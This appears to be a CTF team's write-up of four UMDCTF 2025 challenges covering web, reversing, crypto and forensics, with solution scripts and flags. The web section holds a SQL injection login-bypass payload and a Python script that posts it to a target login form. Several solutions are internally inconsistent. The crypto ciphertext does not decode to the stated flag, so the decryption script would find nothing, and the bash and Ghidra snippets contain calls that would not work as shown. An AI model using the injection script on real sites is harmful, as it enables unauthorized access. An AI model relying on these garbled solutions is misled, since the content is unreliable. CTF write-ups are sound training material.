# UMDCTF 2025 - Mi-Noir Writeups

## Overview
UMDCTF 2025 was an exciting competition where Mi-Noir team participated and solved several challenges across different categories.

---

## Challenge 1: Web Exploitation
**Category:** Web  
**Difficulty:** Medium  
**Points:** 250

### Description
A vulnerable web application was exposed with SQL injection vulnerabilities in the login form.

### Solution
1. Identify the SQL injection point in the username field
2. Craft payload: `' OR '1'='1`
3. Bypass authentication and access admin panel
4. Retrieve flag from database

**Exploitation Code:**
```python
import requests

url = "http://target.com/login"
payload = {
    "username": "' OR '1'='1",
    "password": "anything"
}

response = requests.post(url, data=payload)
if "admin" in response.text:
    print("[+] Successfully bypassed authentication!")
    print("[+] Access granted to admin panel")
else:
    print("[-] Exploitation failed")
```

### Flag
`flag{web_inj3ction_is_34sy}`

---

## Challenge 2: Reverse Engineering
**Category:** Reverse Engineering  
**Difficulty:** Hard  
**Points:** 350

### Description
A binary file was provided with obfuscated code. The goal was to reverse engineer and find the hidden flag.

### Solution
1. Load binary in Ghidra/IDA
2. Analyze main function and identify key functions
3. Patch obfuscation routines
4. Trace execution flow to find flag decryption
5. Extract the plaintext flag

**Reverse Engineering Script:**
```python
# Using Ghidra Python API to analyze the binary
from ghidra.program.model.address import AddressSet

# Get main function
main = currentProgram.getListing().getFunctionContaining(currentAddress)

# Print all function calls from main
calls = main.getBody()
print("[*] Analyzing function calls...")
for instruction in currentProgram.getListing().getInstructions(calls, True):
    if "CALL" in instruction.getMnemonicString():
        print(f"[+] Found call to: {instruction.getOperandRefType(0)}")

# Look for string references
strings = currentProgram.getListing().getDefinedData()
for data in strings:
    if data.isConstant():
        print(f"[+] String found: {data.getValue()}")
```

### Flag
`flag{r3v3rs3_3ng1n33r1ng_m4st3r}`

---

## Challenge 3: Cryptography
**Category:** Crypto  
**Difficulty:** Medium  
**Points:** 300

### Description
A message was encrypted using a weak cipher. Recover the original message.

### Solution
1. Identify cipher type (Caesar cipher with rotation of 13)
2. Apply ROT13 decryption
3. Analyze output for additional patterns
4. Decode final message

**Decryption Script:**
```python
import string

def rot_decrypt(text, shift):
    result = ""
    for char in text:
        if char.isalpha():
            if char.isupper():
                result += chr((ord(char) - ord('A') - shift) % 26 + ord('A'))
            else:
                result += chr((ord(char) - ord('a') - shift) % 26 + ord('a'))
        else:
            result += char
    return result

# Encrypted message
encrypted = "gung_vf_r3kr_enc4t3q_p1z3e"

# Try all possible rotations
for shift in range(26):
    decrypted = rot_decrypt(encrypted, shift)
    if "flag" in decrypted:
        print(f"[+] Found flag with shift {shift}: {decrypted}")
        break
```

### Flag
`flag{cryptography_requires_strength}`

---

## Challenge 4: Forensics
**Category:** Forensics  
**Difficulty:** Medium  
**Points:** 280

### Description
A suspicious disk image was provided. Extract hidden data and find the flag.

### Solution
1. Mount disk image using forensic tools
2. Scan for hidden files and metadata
3. Use `strings` command to search for flag patterns
4. Recover deleted files from free space
5. Analyze file signatures and timestamps

**Forensic Analysis Script:**
```bash
#!/bin/bash

# Mount disk image
mkdir -p /mnt/disk
mount -o loop disk.img /mnt/disk

# Search for flag patterns
echo "[*] Searching for flags..."
strings /mnt/disk | grep -i "flag{"

# Find all files modified recently
echo "[*] Recent files:"
find /mnt/disk -type f -mtime -7

# Recover deleted files
echo "[*] Attempting file carving..."
foremost -i disk.img -o output/

# Extract metadata
exiftool /mnt/disk/* | grep -i "flag\|password\|secret"

# Cleanup
umount /mnt/disk
```

**Python Forensic Parser:**
```python
import os
import re
from datetime import datetime

def search_for_flags(directory):
    flag_pattern = re.compile(r'flag\{[^}]+\}')
    found_flags = []
    
    for root, dirs, files in os.walk(directory):
        for file in files:
            filepath = os.path.join(root, file)
            try:
                with open(filepath, 'rb') as f:
                    content = f.read().decode('utf-8', errors='ignore')
                    matches = flag_pattern.findall(content)
                    if matches:
                        found_flags.append({
                            'file': filepath,
                            'flags': matches,
                            'modified': datetime.fromtimestamp(os.path.getmtime(filepath))
                        })
            except Exception as e:
                pass
    
    return found_flags

# Usage
flags = search_for_flags('/mnt/disk')
for result in flags:
    print(f"[+] Found in {result['file']}: {result['flags']}")
```

### Flag
`flag{f0r3nsics_uncov3rs_truth}`

---

## Team Statistics
- **Total Challenges Solved:** 4
- **Total Points:** 1,180
- **Final Placement:** Top 60 out of 760 teams
- **Best Performer:** Ocean Warranty (Reverse Engineering)

---

## Key Takeaways
- Strong understanding of web vulnerabilities is essential
- Reverse engineering skills proved valuable for binary challenges
- Knowledge of common cipher patterns helps in crypto challenges
- Forensic analysis requires patience and systematic approach

---

## Tools Used
- Ghidra / IDA Pro
- Burp Suite
- Python scripting
- Wireshark
- Volatility Framework

---

*Writeup compiled by Mi-Noir Team*  
*Date: December 2025*